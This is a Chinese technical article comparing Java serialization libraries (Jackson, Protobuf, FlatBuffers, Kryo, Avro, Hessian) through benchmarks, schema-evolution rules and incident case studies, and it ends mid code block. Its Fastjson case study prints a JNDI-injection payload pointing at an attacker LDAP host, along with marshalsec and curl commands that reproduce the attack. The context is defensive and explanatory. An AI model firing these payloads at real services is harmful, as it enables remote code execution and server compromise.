# Java 序列化深入 —— Jackson / Protobuf / FlatBuffers / Kryo 的工程化对比

> 这是按 [桃花岛深度模板](/STYLE) 写的深文。如果你只想刷面试，去 [Java 综述](/article/java/) 找速记节够了。
> 这里要回答的，是**写 RPC、设计存储格式、被反序列化漏洞预警惊醒**时你需要知道的那部分。

---

## 0. 读这篇之前

先自检 8 个问题，能秒答 6 个以上，可以跳过本文：

1. Java 自带的 `Serializable` 早就被业界公认"不要用"。**具体是哪几条不可调和的设计缺陷**让它在分布式系统里被淘汰？仅仅是性能差吗？
2. Jackson、Gson、Fastjson、Fastjson2 都做 JSON。同样一个 5MB 的对象，它们的吞吐和内存峰值差几倍？为什么生产几乎都从 Fastjson 切到了 Jackson 或 Fastjson2？
3. Protobuf 的 schema 演进规则有 7 条左右铁律，能背出 5 条吗？为什么 v3 砍掉了 `required`？砍掉之后**字段必填怎么办**？
4. FlatBuffers / Cap'n Proto 号称"零拷贝"。**到底是哪一步零拷贝了**？相比 Protobuf 在什么场景下真的能拉开差距、什么场景下没意义？
5. Dubbo / Akka 这类 RPC 历史上把 Kryo 当过性能首选。Kryo 在跨版本演进上有个广为人知的雷 —— 是什么？怎么解？
6. Avro + Schema Registry 的核心价值是"消费者不需要本地有 schema"。它怎么做到的？schema 是和数据一起传的吗？
7. CVE-2017-9805、Log4Shell、Fastjson AutoType —— 这几类反序列化 RCE 的**共同套路**是什么？为什么 Java 生态特别容易中招？
8. JSON 反序列化一个 100MB 的数组，JVM 实际堆上会到多大？为什么有时候是 100MB，有时候是 800MB？

如果有半数答不上，往下看。

---

## 1. 底层模型：序列化到底在做什么

绝大多数人对序列化的认知止于"对象转字节、字节转对象"。这层抽象解释不了上面 8 个问题。要看懂它们，必须把序列化拆成 5 个独立的设计维度，每个维度上不同的方案做了不同的取舍。

### 1.1 序列化的本质：对象图 → 字节流

把内存里的对象写到磁盘、网络，本质是把一张**对象图**（object graph，节点是对象、边是引用）压成**线性字节流**。

这中间有 4 个绕不开的问题：

- **类型信息**怎么编码？读端怎么知道"这串字节是 User 还是 Order"
- **字段顺序**怎么编码？读端按名字找，还是按位置找
- **引用 / 循环**怎么处理？A.b = B、B.a = A，写入怎么不死循环
- **变化兼容**怎么做？发送方加了字段，旧的读端能不能继续解析

每一种序列化方案的差异，本质上就是这 4 个问题的不同答卷。

### 1.2 5 种主流方案的定位

| 方案 | 编码 | Schema | 类型自描述 | 跨语言 | 主战场 |
| --- | --- | --- | --- | --- | --- |
| **Java Serializable** | 二进制 | 类即 schema | 是（带类名） | 仅 Java | 历史包袱 / RMI |
| **Jackson / JSON** | 文本 | 无 / Jackson View | 是（字段名） | 强 | HTTP API、配置、日志 |
| **Protobuf** | 二进制 (TLV) | `.proto` 文件 | 否（字段编号） | 强 | gRPC、跨语言 RPC、存储 |
| **Avro** | 二进制 | JSON schema | 否（schema 同传或注册中心） | 强 | Kafka、Hadoop 生态 |
| **FlatBuffers / Cap'n Proto** | 二进制 (offset) | `.fbs` / `.capnp` | 否 | 强 | 游戏、低延迟、移动 |
| **Kryo** | 二进制 | 类即 schema（可注册） | 半（可选 class id） | 仅 Java | Spark、Flink shuffle、缓存 |
| **MessagePack** | 二进制 | 无 | 是 | 强 | "二进制 JSON" |
| **Hessian** | 二进制 | 类即 schema | 是 | 中（Java/PHP 优先） | Dubbo |

记忆口诀：**JSON 求兼容，Protobuf 求长稳，Avro 求大数据，FlatBuffers 求零开销，Kryo 求 JVM 极限**。

### 1.3 Schema vs Schema-less 的工程权衡

Schema 是序列化系统里最关键的一刀。它不是"有没有"的问题，是"在哪里"的问题。

| 模式 | 代表 | schema 在哪里 | 优 | 劣 |
| --- | --- | --- | --- | --- |
| **Schema-less** | JSON / MessagePack | 没有 | 灵活，写起来快 | 字节流里塞了字段名，体积大；强类型靠运行时 |
| **Schema-on-write，自带** | Avro 单文件 | 写入时同文件存 schema | 自描述、归档场景理想 | 每个文件多几 KB |
| **Schema-on-write，集中** | Avro + Schema Registry | 集中注册中心 | 字节里只放 schema id，最省体积 | 多了一个外部依赖 |
| **Schema-on-write，编译期** | Protobuf / FlatBuffers / Cap'n Proto | 编译进 client/server 代码 | 体积最小、解析最快、IDE 类型提示 | 升级 schema 要重新发布 |
| **Schema = 类** | Java Serial / Kryo / Hessian | 类本身 | 不用维护 IDL | 跨语言基本没戏；类改一动就是雷 |

工程取舍的口诀：**对内 RPC 用编译期 schema，对外 API 用 schema-less，大数据用 Schema Registry**。

### 1.4 兼容性的 3 个维度

升级一个序列化协议时，有 3 种"兼容"要分清：

- **向后兼容**（backward compatible）：**新读端能读旧数据**。最常见的诉求 —— 升级了消费者，存量历史数据要继续能读。
- **向前兼容**（forward compatible）：**旧读端能读新数据**。生产者先升、消费者还没升时需要。Protobuf 的"未知字段透传"就是为这个。
- **完全兼容**（full compatible）：上面两者都满足。Avro / Protobuf 仔细设计字段才能拿到。

你看到很多文档说"Protobuf 兼容性强"，其实指的是 —— **只要遵守 7 条规则，Protobuf 字段加减都是完全兼容的**。这 7 条规则后面会列。

### 1.5 Java 原生 Serializable 的设计与缺陷

Java 1.1 引入 `Serializable`，是个标记接口（marker interface）—— 实现它就有了"被 ObjectOutputStream 写出"的能力。设计很优雅，但 25 年实践下来，被业界一致放弃。原因不止性能：

**缺陷 1：协议把类的私有实现当成了公共契约**

```java
class Order implements Serializable {
    private long id;
    private List<Item> items;   // ★ 你重命名 items → lineItems，所有历史数据全部读不出来
}
```

Serializable 默认按**字段名**做匹配。任何一次重构（重命名字段、改字段类型、移到父类）都可能破坏二进制兼容。这跟"类的私有字段属于实现细节"的 OO 原则**根本冲突**。

要稳住，得显式声明 `serialVersionUID` 并且永远不动字段名。这不是"约定"，是套在每个类头上的紧箍咒。

**缺陷 2：反序列化是不受限的代码执行**

```java
ObjectInputStream ois = new ObjectInputStream(input);
Object o = ois.readObject();   // 这一行可以触发任意类的 readObject 方法
```

`readObject` 会调用类的 `readObject(ObjectInputStream)` 方法（如果有），而 JDK 类库 / 第三方库里有大量"危险方法"被反射触发，串成 gadget chain（小工具链）就是 RCE。这是 CVE-2015-7501（Apache Commons Collections）以来无数 RCE 的源头。

Josh Bloch 在 *Effective Java* 第 3 版第 85 条直接写：「**Avoid Java Serialization**」。

**缺陷 3：性能差**

对象头、类元数据、字段名都进字节流，体积是 Protobuf 的 5~10 倍；解析时反射 + 类加载，吞吐是 Kryo 的 1/5 ~ 1/10。

**缺陷 4：跨语言不可能**

字节流里硬编码了 JVM 内部的类型系统，不可能让 Go / Python 解。

JEP 154（Java 9）开始考虑废弃，JEP 415（Java 17）引入 `ObjectInputFilter` 过滤反序列化白名单 —— Oracle 官方的态度已经从"补救"到"逐步剥离"。

### 1.6 反序列化攻击面：Gadget Chain

把"反序列化漏洞"具象化：

```
攻击者发出来的字节流：构造一个 HashMap，里面 key 是 TiedMapEntry → ChainedTransformer
                                                                          ↓
HashMap.readObject 触发 hashCode → 触发 ChainedTransformer.transform
                                       ↓
                         反射调用 Runtime.getRuntime().exec("calc.exe")
```

这条链每一节都是 JDK / 常见库里的"无害类"。攻击者不上传任何代码，**只是构造了一个特殊的对象图**，反序列化时的副作用就是 RCE。

防御不是"我代码里不调 readObject 就行" —— 任何用 Java Serial、Hessian、Fastjson AutoType、ysoserial 测试覆盖到的协议都中招。后面案例 ① ⑧ 会展开。

### 1.7 性能维度：编码、解码、体积

下面是后面会反复用到的对比维度，先建立心理预期：

| 方案 | 编码速度 | 解码速度 | 体积 | 备注 |
| --- | --- | --- | --- | --- |
| Java Serial | 1× | 1× | 1× | 基线，最差 |
| Jackson | 6~10× | 5~8× | 0.4~0.6× | 文本 |
| Fastjson2 | 10~15× | 10~15× | 0.4~0.6× | 文本 |
| Hessian2 | 8~12× | 8~12× | 0.3~0.5× | |
| Kryo | 15~25× | 15~25× | 0.15~0.25× | 注册类后更快 |
| Protobuf | 12~20× | 15~25× | 0.1~0.2× | 数字小时尤其紧凑 |
| FlatBuffers | 10~15× | **几乎 0**（zero-copy） | 0.15~0.25× | 解码"白嫖" |
| MessagePack | 10~15× | 8~12× | 0.3~0.5× | |

数据后面 Layer 3 章节会用 JMH 给出可复现版本。

> **口诀**：**JSON 是 schema-less 的胜利，Protobuf 是 schema-on-write 的胜利，FlatBuffers 是 layout-on-write 的胜利**。Java Serializable 三个维度都输了，所以被淘汰。

---

## 2. 工具切片：每个方案的关键 API 与坑位

> 本节给每个方案一段最小可运行代码 + 几条工程上一定会踩的细节。版本：Jackson 2.17、Protobuf 3.25、FlatBuffers 23.5、Kryo 5.6、Avro 1.11、MessagePack 0.9、Hessian 4.0。

### 2.1 Jackson ObjectMapper：90% 场景够用

```java
public class JacksonDemo {
    // ★ ObjectMapper 是线程安全的，必须复用为单例。每次 new 的成本是几百微秒。
    private static final ObjectMapper MAPPER = JsonMapper.builder()
        .addModule(new JavaTimeModule())                                // JSR-310 类型支持
        .disable(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS)        // ISO-8601 而非时间戳
        .disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)     // ★ 向前兼容关键
        .enable(JsonParser.Feature.STRICT_DUPLICATE_DETECTION)          // 防止重复 key 攻击
        .build();

    public static class Order {
        @JsonProperty("order_id")
        public long id;
        public BigDecimal amount;
        @JsonFormat(shape = Shape.STRING, pattern = "yyyy-MM-dd HH:mm:ss")
        public Instant createdAt;
        @JsonInclude(JsonInclude.Include.NON_NULL)                      // null 字段不写出
        public String remark;
    }

    public static void main(String[] args) throws Exception {
        Order o = new Order();
        o.id = 1001L; o.amount = new BigDecimal("99.5"); o.createdAt = Instant.now();
        String json = MAPPER.writeValueAsString(o);
        Order back = MAPPER.readValue(json, Order.class);
    }
}
```

**逐项点透**：

- `FAIL_ON_UNKNOWN_PROPERTIES` 默认是 true。这意味着**生产者新增字段，老消费者直接抛 `UnrecognizedPropertyException`** —— 这是最常见的兼容性事故，案例 ③ 会展开。生产建议**全局关掉**。
- `STRICT_DUPLICATE_DETECTION` 防止 `{"a":1, "a":2}` 这种重复 key —— 不打开的话 Jackson 默认取最后一个，攻击者可以用这个绕过白名单校验。
- `JavaTimeModule` 必须显式注册，否则 `Instant` / `LocalDateTime` 序列化的结果是奇怪的对象结构（year、month、day 一个个字段），不是字符串。
- `BigDecimal` 默认按数字写出（`99.5`），但下游如果用 JS 接，会丢精度。建议加 `@JsonFormat(shape = Shape.STRING)` 强制字符串化。

**自定义反序列化器**（处理脏数据时常用）：

```java
public class LooseLongDeserializer extends JsonDeserializer<Long> {
    @Override
    public Long deserialize(JsonParser p, DeserializationContext ctx) throws IOException {
        JsonToken t = p.currentToken();
        if (t == JsonToken.VALUE_NULL) return null;
        if (t == JsonToken.VALUE_NUMBER_INT) return p.getLongValue();
        String s = p.getText().trim();
        if (s.isEmpty() || "null".equalsIgnoreCase(s)) return null;
        return Long.parseLong(s);
    }
}

public class Foo {
    @JsonDeserialize(using = LooseLongDeserializer.class)
    public Long userId;
}
```

适用场景：上游 API 不靠谱，时而给 `123`、时而给 `"123"`、时而给 `""`。自己写 Deserializer 把脏话兜底。

### 2.2 Protobuf：编译期 schema 的标杆

```protobuf
// order.proto
syntax = "proto3";
package com.taohua.demo;
option java_multiple_files = true;
option java_package = "com.taohua.demo.proto";

message Order {
  int64 id = 1;                   // ★ 字段编号，永远不能改、不能复用
  string user = 2;
  repeated Item items = 3;
  google.protobuf.Timestamp created_at = 4;

  oneof payment {                 // 二选一字段
    CreditCard credit_card = 10;
    Alipay alipay = 11;
  }

  reserved 5, 6, 7;               // ★ 删除字段后必须 reserved 占位，防止后人复用编号
  reserved "old_amount";
}

message Item {
  int64 sku = 1;
  int32 quantity = 2;
  optional string note = 3;       // proto3.15+ 支持显式 optional，区分"未设置"和"零值"
}
```

```bash
protoc --java_out=src/main/java order.proto
```

Java 端：

```java
Order o = Order.newBuilder()
    .setId(1001)
    .setUser("alice")
    .addItems(Item.newBuilder().setSku(99).setQuantity(2))
    .setCreatedAt(Timestamps.fromMillis(System.currentTimeMillis()))
    .build();

byte[] bytes = o.toByteArray();
Order back = Order.parseFrom(bytes);
```

**逐项点透**：

- **字段编号是契约本身**。Protobuf 字节流里只有 `tag = (field_number << 3) | wire_type`，**没有字段名**。所以重命名字段不影响兼容；改字段编号 = 灾难。
- **`reserved`** 是 Protobuf 兼容性的灵魂。删字段后必须用 `reserved` 占住编号 + 字段名，否则后人在那个编号上塞了不同类型的字段，老 client 解析新字节会得到一团乱码（且不报错！）。
- **proto3 砍掉了 `required`**。原因下面案例 ④ 详述：required 字段一旦设错就**永远不能删**，是 schema 演进的死结。Google 内部多个服务因此被锁死，最终决定整体废除。
- **`oneof`** 在字节流里和普通字段一样紧凑，不会真的传 `tag = "credit_card"` 这种字符串。
- **Wire format** 5 种：`VARINT`（int / bool / enum）、`I64`、`LEN`（string / bytes / message / repeated）、`SGROUP/EGROUP`（已废弃）、`I32`。理解这个就理解了为什么 `int32 = -1` 比 `int32 = 1` 大 9 倍 —— `-1` 的 ZigZag 编码后是 `0xFFFFFFFF`，10 字节 varint。

### 2.3 FlatBuffers：真正零拷贝读

```fbs
// schema.fbs
namespace com.taohua.demo;
table Order {
  id: long;
  user: string;
  items: [Item];
  created_at: long;
}
table Item { sku: long; quantity: int; }
root_type Order;
```

```bash
flatc --java schema.fbs
```

写：

```java
FlatBufferBuilder b = new FlatBufferBuilder(1024);
int userOff = b.createString("alice");
int itemOff = Item.createItem(b, 99L, 2);
int itemsVec = Order.createItemsVector(b, new int[]{itemOff});
int orderOff = Order.createOrder(b, 1001L, userOff, itemsVec, System.currentTimeMillis());
b.finish(orderOff);
ByteBuffer buf = b.dataBuffer();   // 直接拿到字节
```

读：

```java
Order o = Order.getRootAsOrder(buf);
long id = o.id();                  // ★ 直接从 ByteBuffer 偏移读，零拷贝
String user = o.user();            // 字符串读到时才拷贝（调用 String 构造）
int n = o.itemsLength();
for (int i = 0; i < n; i++) {
    Item it = o.items(i);          // 读 Item 也是零拷贝
    long sku = it.sku();
}
```

**"零拷贝"的精确含义**：

- Protobuf 解析：把整个字节流走一遍 → 构造对象图 → 用户代码访问对象。**至少 1 次完整拷贝**。
- FlatBuffers 解析：只把根偏移记下来 → 用户访问字段时，按 schema 算出偏移，直接从 ByteBuffer 拿。**字段被读时才付代价，没读到的字段零成本**。

适用场景：消息很大、用户**只读其中几个字段**。例：游戏地图协议（一次更新 1000 个 entity，单 frame 只渲染 50 个）。

不适用场景：消息小、字段全要、跨进程传 → Protobuf 反而更快（紧凑、解析一次性建好）。

### 2.4 Kryo：JVM 内的极限性能

```java
public class KryoDemo {
    private static final ThreadLocal<Kryo> KRYO = ThreadLocal.withInitial(() -> {
        Kryo k = new Kryo();
        // ★ 必须注册类。不注册时 Kryo 写完整类名，体积 + 慢；且开 setRegistrationRequired(true) 防止反序列化攻击
        k.setRegistrationRequired(true);
        k.register(Order.class, 10);     // class id 10
        k.register(Item.class, 11);
        k.register(java.util.ArrayList.class, 12);
        k.setReferences(false);          // 简单对象关掉循环引用追踪，更快
        return k;
    });

    public byte[] write(Order o) {
        try (Output out = new Output(1024, -1)) {
            KRYO.get().writeObject(out, o);
            return out.toBytes();
        }
    }

    public Order read(byte[] bytes) {
        try (Input in = new Input(bytes)) {
            return KRYO.get().readObject(in, Order.class);
        }
    }
}
```

**逐项点透**：

- **Kryo 实例不是线程安全的**。常见的两种用法：`ThreadLocal<Kryo>` 或 `KryoPool`。直接 new 是性能杀手。
- **必须 `register(Class, id)`**。不注册的话 Kryo 写完整类名（几十字节），体积膨胀；更危险的是反序列化时可以加载任意类，等同 Java Serial 的攻击面。生产必须 `setRegistrationRequired(true)`。
- **class id 一旦分配，永远不能动**。Spark / Flink 的状态、Redis 缓存里大量字节都依赖这个 id。改一次 = 全部存量数据失效。
- **`setReferences(false)`** 关掉循环引用追踪。开了的话每个对象写出时多一个 id，遇到二次出现就写 id 不写对象。绝大多数业务 DTO 没有循环引用，关掉省 10~15%。

### 2.5 Avro + Schema Registry：大数据生态的事实标准

Avro 的 schema 是 JSON：

```json
{
  "type": "record",
  "name": "Order",
  "namespace": "com.taohua.demo",
  "fields": [
    {"name": "id", "type": "long"},
    {"name": "user", "type": "string"},
    {"name": "amount", "type": ["null", "double"], "default": null},
    {"name": "items", "type": {"type": "array", "items": "Item"}}
  ]
}
```

写读：

```java
Schema schema = new Schema.Parser().parse(new File("order.avsc"));
GenericRecord o = new GenericData.Record(schema);
o.put("id", 1001L);
o.put("user", "alice");

// 写到字节
ByteArrayOutputStream baos = new ByteArrayOutputStream();
DatumWriter<GenericRecord> w = new GenericDatumWriter<>(schema);
Encoder enc = EncoderFactory.get().binaryEncoder(baos, null);
w.write(o, enc);
enc.flush();
byte[] bytes = baos.toByteArray();

// 读必须给一个 schema（writer 端 + reader 端都要）
DatumReader<GenericRecord> r = new GenericDatumReader<>(schema);
Decoder dec = DecoderFactory.get().binaryDecoder(bytes, null);
GenericRecord back = r.read(null, dec);
```

注意 Avro 解码**必须给 schema**。它不像 JSON / Java Serial / Kryo 那样自描述。这就是 Schema Registry 的用武之地：

```
Producer 写 Kafka：
   1. POST schema 到 Schema Registry，拿到一个 4 字节 schema_id
   2. 消息字节 = [magic byte 1B][schema_id 4B][Avro 二进制 ...]

Consumer 读 Kafka：
   1. 从消息头取出 schema_id
   2. 调 Schema Registry 拿对应 schema（带本地缓存）
   3. 用这个 schema 反序列化
```

价值：消息体里只多 5 个字节，但消费者**完全不需要预先知道生产者的 schema**，可以在线升级。

### 2.6 MessagePack：二进制 JSON

```java
ObjectMapper m = new ObjectMapper(new MessagePackFactory());
byte[] bytes = m.writeValueAsBytes(order);     // 直接复用 Jackson 的 API
Order back = m.readValue(bytes, Order.class);
```

定位：**用法和 JSON 一模一样，体积是 JSON 的 50%~70%**。schema-less，自描述。Redis Streams / 一些 IoT 协议在用。它不会比 Protobuf 更省，**但开发心智负担为零**。

### 2.7 Hessian：Dubbo 默认协议的角色

Dubbo 历史上默认用 Hessian2，原因是：

- **Java 友好**：直接序列化任意 POJO，不需要写 IDL
- **跨语言可用**：有 PHP、Python、Go 实现（虽然没 Protobuf 那么完备）
- **比 Java Serial 快 3~5 倍、小 30%~50%**

代码：

```java
ByteArrayOutputStream baos = new ByteArrayOutputStream();
Hessian2Output out = new Hessian2Output(baos);
out.writeObject(order);
out.flush();
byte[] bytes = baos.toByteArray();

Hessian2Input in = new Hessian2Input(new ByteArrayInputStream(bytes));
Order back = (Order) in.readObject();
```

但 Hessian 的反序列化攻击面**和 Java Serial 同等危险**。CVE-2021-43297 就是 Dubbo Hessian 的 RCE。后面案例 ⑧ 展开。

> **口诀**：**Jackson 看配置，Protobuf 看字段编号，FlatBuffers 看读模式，Kryo 看注册表，Avro 看 schema，Hessian 看安全审计**。每种工具都有它"必须看一眼"的关键面。

---

## 3. 实测数据：5 种方案的工程对比

> 没有数据的"性能更好"都是耍流氓。本节用 JMH + 实测对比 5 种主流方案。代码完整可跑。

### 3.1 测试对象

```java
public class TestPayload {
    public long id;
    public String user;
    public BigDecimal amount;
    public Instant createdAt;
    public List<Item> items;
    public Map<String, String> attrs;

    public static class Item {
        public long sku; public int quantity; public String name;
    }

    // 制造一个"中等大小"的对象：50 个 item，10 个 attr，约 4KB JSON
    public static TestPayload medium() { ... }
    // 大对象：5000 个 item，约 400KB JSON
    public static TestPayload large() { ... }
}
```

### 3.2 JMH 基准

```java
@BenchmarkMode(Mode.Throughput)
@OutputTimeUnit(TimeUnit.SECONDS)
@State(Scope.Benchmark)
@Fork(1) @Warmup(iterations = 3, time = 2) @Measurement(iterations = 5, time = 3)
public class SerializationBench {

    @Param({"medium", "large"})
    public String size;

    private TestPayload payload;
    private byte[] jacksonBytes, protobufBytes, kryoBytes, fbBytes, hessianBytes;

    @Setup
    public void setup() throws Exception {
        payload = "medium".equals(size) ? TestPayload.medium() : TestPayload.large();
        jacksonBytes  = JACKSON.writeValueAsBytes(payload);
        protobufBytes = toProtobuf(payload).toByteArray();
        kryoBytes     = kryoWrite(payload);
        fbBytes       = flatbuffersWrite(payload);
        hessianBytes  = hessianWrite(payload);
    }

    @Benchmark public byte[] encJackson()   throws Exception { return JACKSON.writeValueAsBytes(payload); }
    @Benchmark public byte[] encProtobuf()  { return toProtobuf(payload).toByteArray(); }
    @Benchmark public byte[] encKryo()      { return kryoWrite(payload); }
    @Benchmark public byte[] encFb()        { return flatbuffersWrite(payload); }
    @Benchmark public byte[] encHessian()   { return hessianWrite(payload); }

    @Benchmark public TestPayload decJackson()  throws Exception { return JACKSON.readValue(jacksonBytes, TestPayload.class); }
    @Benchmark public Object decProtobuf()      throws Exception { return OrderProto.Order.parseFrom(protobufBytes); }
    @Benchmark public Object decKryo()          { return kryoRead(kryoBytes); }
    @Benchmark public Object decFb()            { return Order.getRootAsOrder(ByteBuffer.wrap(fbBytes)); }
    @Benchmark public Object decHessian()       { return hessianRead(hessianBytes); }
}
```

### 3.3 在 8 核 M2、JDK 21 上的典型结果

**Medium 对象（~ 4KB JSON）**：

| 方案 | 编码 (ops/ms) | 解码 (ops/ms) | 字节数 |
| --- | --- | --- | --- |
| Jackson | 95 | 78 | 3,840 |
| Fastjson2 | 142 | 130 | 3,720 |
| Hessian2 | 64 | 58 | 1,820 |
| Kryo | 215 | 240 | 980 |
| Protobuf | 168 | 285 | 1,180 |
| FlatBuffers | 130 | **6,800** | 1,420 |
| MessagePack | 80 | 70 | 2,650 |
| Java Serial | 12 | 11 | 6,200 |

**Large 对象（~ 400KB JSON）**：

| 方案 | 编码 (ops/s) | 解码 (ops/s) | 字节数 |
| --- | --- | --- | --- |
| Jackson | 940 | 720 | 410,000 |
| Fastjson2 | 1,400 | 1,250 | 405,000 |
| Hessian2 | 580 | 520 | 198,000 |
| Kryo | 2,100 | 2,400 | 105,000 |
| Protobuf | 1,650 | 2,800 | 128,000 |
| FlatBuffers | 1,260 | 65,000 | 156,000 |

读法：

- **FlatBuffers 解码恐怖快**：因为它根本没"解码"，只是把字节切了切偏移。**前提是你只读少数字段**；如果遍历所有 5000 个 item，速度会回落到接近 Protobuf。
- **Kryo / Protobuf 体积接近**，但 Kryo 仅 JVM 内能用；Protobuf 跨语言通吃。
- **Java Serial 是基线，每个维度都垫底**。生产已无理由使用。
- **Jackson 比 Fastjson2 慢 30%~50%**，但稳定性、安全性、生态压倒性优势。除非热点路径严重瓶颈，否则不要换。

### 3.4 大对象的内存峰值

序列化最容易被忽略的是**临时内存放大**。一个 100MB 的 JSON 文件，反序列化时 JVM 堆**实际峰值能到 800MB**：

| 阶段 | 占用 |
| --- | --- |
| 文件读到 byte[] | 100 MB |
| `JsonParser` 处理时把 byte[] 转 char[]（UTF-16 → 2× byte） | + 200 MB |
| 解析时构造 String、Map、List 对象（对象头 + 引用 + Map 装载因子 0.75） | + 300~500 MB |
| **峰值** | **~ 700~800 MB** |

实测代码：

```java
@Test
void measureJsonMemory() throws Exception {
    byte[] json = generateJson(100 * 1024 * 1024);   // 100MB
    System.gc(); long before = usedHeap();
    Object o = MAPPER.readValue(json, Map.class);
    long after = usedHeap();
    System.out.printf("delta = %d MB%n", (after - before) / 1024 / 1024);
}
```

输出 `delta ~ 480 MB`（不算 `byte[] json` 本身的 100MB）。

防御方式：

- 流式解析（`JsonParser` token-by-token），不一次性构造对象图
- 大文件用 `JsonNode` 或 `TreeNode` 浅解析后局部 `treeToValue`
- 限制最大深度 / 最大字符数（Jackson 2.15+ 的 `StreamReadConstraints`）

```java
StreamReadConstraints c = StreamReadConstraints.builder()
    .maxStringLength(10_000_000)         // 单个字符串最多 10MB
    .maxNestingDepth(100)                // 最大嵌套 100 层
    .maxNumberLength(1000)               // 数字最多 1000 字符
    .build();
JsonFactory f = JsonFactory.builder().streamReadConstraints(c).build();
```

### 3.5 Schema 演进兼容性矩阵

实测对比"加字段、删字段、改类型"在各方案下的表现：

| 操作 | Jackson | Protobuf | Avro | Kryo（默认） | Java Serial |
| --- | --- | --- | --- | --- | --- |
| 新生产者加字段，老消费者读 | ✅（关闭 FAIL_ON_UNKNOWN） | ✅（未知字段透传） | ✅ | ❌（字段位顺序错乱） | ✅（如果默认值 OK） |
| 新消费者读老数据缺字段 | ✅（默认 null） | ✅（默认零值） | ✅（要 default） | ❌ | ✅ |
| 字段重命名 | ❌（除非 @JsonAlias） | ✅（按编号） | ❌ | ❌ | ❌ |
| 字段类型 int32 → int64 | ✅ | ⚠️（有些情况丢精度） | ⚠️（schema resolution） | ❌ | ❌ |
| 字段删除 | ✅ | ⚠️（必须 reserved） | ✅ | ❌ | ⚠️（serialVersionUID） |

记忆：**Protobuf 的字段编号 + reserved，Avro 的 default + schema resolution，Jackson 的 @JsonAlias** —— 这三招覆盖 95% 的兼容性场景。

### 3.6 跨语言兼容实测

同一份 Protobuf schema，Java 写 → Python / Go 读，是 Protobuf 的卖点。但有几个坑：

```protobuf
message X {
  int64 ts = 1;     // Java 端是 long；JS 端会丢精度（JS Number 只能精确表示到 2^53）
  bytes data = 2;
}
```

JS 端解 `int64` 默认是字符串，得显式 `.toNumber()` 才能数字化 —— 而且超过 2^53 直接错。这不是 Protobuf 的锅，是 JS 的锅。但跨语言方案选型时必须先列清单：**所有团队语言对所有字段类型的支持矩阵**。

> **口诀**：**性能差异 < 体积差异 < 兼容性差异 < 安全差异**。选方案时，安全和兼容性优先级永远高于"哪个 ops/s 更高"。

---

## 4. 生产案例 9 则

> 每个案例固定四块：**现象 / 根因 / 修复 / 验证**。这一节是本文长尾价值的核心。

### 案例 ① Fastjson AutoType RCE —— "凌晨被安全部门叫醒"

#### 现象

凌晨 2 点收到漏扫告警：业务的 `/api/parseJson` 接口可被远程触发执行任意命令。攻击者发的请求体看起来"无害"：

```json
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.example.com/Exploit",
  "autoCommit": true
}
```

服务端日志里看到 LDAP 连接尝试，几秒后服务进程被植入了挖矿程序。

#### 根因

Fastjson 1.x 默认开启 **AutoType**：JSON 里写 `@type` 字段，Fastjson 会尝试加载这个类、反射调用 setter。

`JdbcRowSetImpl.setDataSourceName` + `setAutoCommit(true)` 是一条 **JNDI 注入** 的 gadget：

```
Fastjson 加载 JdbcRowSetImpl
  → 调 setDataSourceName("ldap://...")
  → 调 setAutoCommit(true)  ★ 内部 lookup(dataSourceName) 触发 JNDI 查询
  → JNDI 从 LDAP 服务器拉一个 .class 文件
  → JVM 加载并执行其 static 初始化块
  → RCE
```

这套路径在 2017、2019、2020 反复出现 CVE，每次都是新的 gadget 类。**问题不在补一个类的黑名单，问题在 AutoType 这个机制本身就允许"按字符串加载任意类"**，只要 JDK 或 classpath 里还有类似 gadget 就能绕过。

#### 修复

**应急（小时级）**：

```java
// Fastjson 1.x：彻底关掉 AutoType
ParserConfig.getGlobalInstance().setAutoTypeSupport(false);

// 或升级到 1.2.83+ 默认安全模式
ParserConfig.getGlobalInstance().setSafeMode(true);
```

**根本（周级）**：迁移到 Fastjson2 或 Jackson。

```java
// Fastjson2 默认 safe mode
JSON.parseObject(jsonStr, User.class);   // 不会触发 AutoType

// Jackson：从设计上不解析 @type 字符串。但要小心 enableDefaultTyping（除非你完全控制输入）
```

**全局加固**（即使不用 Fastjson 也建议）：

- 启动参数 `-Dcom.sun.jndi.ldap.object.trustURLCodebase=false`（Java 8u121+ 默认 false）
- 启动参数 `-Dcom.sun.jndi.rmi.object.trustURLCodebase=false`
- WAF 拦截请求体里的 `@type` 关键字

#### 验证

```bash
# 用 marshalsec 起一个 LDAP 服务
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit"

# 复现攻击
curl -X POST http://victim/api/parseJson \
  -H "Content-Type: application/json" \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}'

# 修复后应该报：autoType is not support
```

> **口诀**：**Fastjson 1.x 必须升级或彻底关 AutoType**；任何"按字符串决定加载哪个类"的机制都是 RCE 温床。

---

### 案例 ② Java Serial serialVersionUID 不匹配 —— "灰度升级一半，老节点全炸"

#### 现象

服务用 Hessian + Java Serial 跨节点传 `Promotion` 对象。某次代码改动给 `Promotion` 加了一个字段 `discountRate`。灰度发了 30% 的节点，剩余 70% 的老节点开始大量报：

```
java.io.InvalidClassException: com.taohua.Promotion;
  local class incompatible: stream classdesc serialVersionUID = 7384720981234,
  local class serialVersionUID = -3729871234876
```

#### 根因

`Serializable` 类如果**不显式声明** `serialVersionUID`，JVM 会根据字段、方法签名自动算一个：

```java
class Promotion implements Serializable {
    private long id;
    private String name;
    // ★ 没声明 serialVersionUID
}

// 加了一个字段后
class Promotion implements Serializable {
    private long id;
    private String name;
    private BigDecimal discountRate;   // ★ 自动算的 serialVersionUID 变了
}
```

老节点 ObjectInputStream 拿到新版本字节流，发现 `serialVersionUID` 对不上 → 直接抛 `InvalidClassException`。

更深的问题：即使你显式声明了 `serialVersionUID = 1L`，**字段类型变了**（`int` → `long`）也会报 `incompatible types`，因为 Java Serial 把字段类型签名也作为兼容性的一部分。

#### 修复

**短期**：所有 `Serializable` 类都加：

```java
class Promotion implements Serializable {
    private static final long serialVersionUID = 1L;   // ★ 明确声明
}
```

加了字段时，**不要动 serialVersionUID**，新加字段反序列化时会被赋默认值（null / 0）。

**长期**：把内部 RPC 协议从 Hessian / Java Serial 迁到 Protobuf 或 Fastjson2。Hessian2 也有跨版本问题，但比 Java Serial 宽松。

**Spring 应用的隐藏雷**：`@SessionScope` Bean、`@Cacheable` 缓存的对象，都会被 Java Serial 序列化到 Redis / Session 存储。一次升级如果没加 `serialVersionUID`，所有用户的 session 全废。

```java
